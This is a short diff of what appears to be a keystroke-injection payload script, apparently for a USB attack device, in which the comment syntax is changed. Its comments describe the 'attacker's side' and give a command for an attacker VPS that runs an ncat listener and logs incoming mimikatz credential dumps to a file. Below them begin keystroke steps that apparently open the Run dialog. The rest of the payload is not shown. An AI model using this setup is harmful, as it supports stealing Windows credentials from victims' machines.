@@ -1,6 +1,6 @@
-REM ####Attacker's side####
-REM ### Run this on Attacker's VPS: ncat -k -l -p 80 | tee mimikatz.log
-REM >>>> IF THE SCRIPT DOESN’T WORK, TRY REMOVE THESE COMMENTS (i.e. starting with "REM") <<<<
+Rem: ####Attacker's side####
+Rem: ### Run this on Attacker's VPS: ncat -k -l -p 80 | tee mimikatz.log
+Rem: >>>> IF THE SCRIPT DOESN’T WORK, TRY REMOVE THESE COMMENTS (i.e. starting with "REM") <<<<
 Delay
 Press:131+114
 Delay
